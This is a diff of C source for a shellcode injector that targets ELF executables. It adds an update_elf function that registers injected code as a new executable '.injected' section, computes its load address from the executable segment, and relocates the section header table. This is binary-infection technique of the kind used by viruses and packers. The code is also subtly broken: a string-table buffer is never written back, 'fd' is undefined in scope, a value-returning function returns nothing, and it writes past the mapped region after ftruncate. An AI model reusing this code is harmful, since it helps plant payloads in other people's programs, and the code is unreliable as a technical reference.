@@ -102,6 +102,58 @@ int get_text_section_index(void *map, Elf64_Ehdr *eheader)
 	return (-1);
 }
 
+void *update_elf(void *map, vsize_t aligned_offset)
+{
+	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;
+	Elf64_Shdr *shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
+	Elf64_Off old_shoff = ehdr->e_shoff;
+	int old_shnum = ehdr->e_shnum;
+	size_t shellcode_size = sizeof(shellcode);
+
+	Elf64_Shdr *shstrtab = &shdr_table[ehdr->e_shstrndx];
+	char *shstrtab_data = (char *)(map + shstrtab->sh_offset);
+
+	// Find current end of .shstrtab
+	size_t new_name_offset = shstrtab->sh_size;
+	char *new_shstrtab_data = realloc(NULL, shstrtab->sh_size + 10); // enough for ".injected\0"
+	memcpy(new_shstrtab_data, shstrtab_data, shstrtab->sh_size);
+	memcpy(new_shstrtab_data + shstrtab->sh_size, ".injected", 10);
+
+	Elf64_Shdr injected_section = {0};
+	injected_section.sh_name = new_name_offset; // Offset in new .shstrtab
+	injected_section.sh_type = SHT_PROGBITS;
+	injected_section.sh_flags = SHF_EXECINSTR | SHF_ALLOC;
+	injected_section.sh_offset = aligned_offset; // Where shellcode is injected
+	injected_section.sh_size = shellcode_size;
+
+	// Calculate sh_addr (virtual address)
+	Elf64_Phdr *phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
+	Elf64_Off base_offset = 0;
+	Elf64_Addr base_vaddr = 0;
+	// This makes sure the shellcode's file offset aligns with where it will be loaded into memory when executed.
+	for (int i = 0; i < ehdr->e_phnum; i++) {
+		if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
+			base_offset = phdr[i].p_offset;
+			base_vaddr = phdr[i].p_vaddr;
+			injected_section.sh_addr = base_vaddr + (aligned_offset - base_offset);
+			break;
+		}
+	}
+
+	Elf64_Off new_shoff = ALIGN_UP(aligned_offset + shellcode_size, 0x1000);
+	ftruncate(fd, new_shoff + (ehdr->e_shnum + 1) * sizeof(Elf64_Shdr)); // Add space for new SHT
+
+	// Copy old section headers and append the new one
+	Elf64_Shdr *old_shdr_table = (Elf64_Shdr *)(map + ehdr->e_shoff);
+	Elf64_Shdr *new_shdr_table = (Elf64_Shdr *)(map + new_shoff);
+	memcpy(new_shdr_table, old_shdr_table, ehdr->e_shnum * sizeof(Elf64_Shdr));
+	memcpy(&new_shdr_table[ehdr->e_shnum], &injected_section, sizeof(Elf64_Shdr));
+
+	// Update ELF header
+	ehdr->e_shoff = new_shoff;
+	ehdr->e_shnum += 1;
+}
+
 /*
 	append_shellcode - takes the name of the file the program is dealing with, opens it,
 		trunscates it to the size of the file + the shellcode it wants to inject and
@@ -135,6 +187,7 @@ void *append_shellcode(char *str)
 		return (NULL);
 	}
 	memcpy(new_map + aligned_offset, shellcode, sizeof(shellcode));
+	update_elf(new_map, aligned_offset);
 	return (new_map);
 }
 
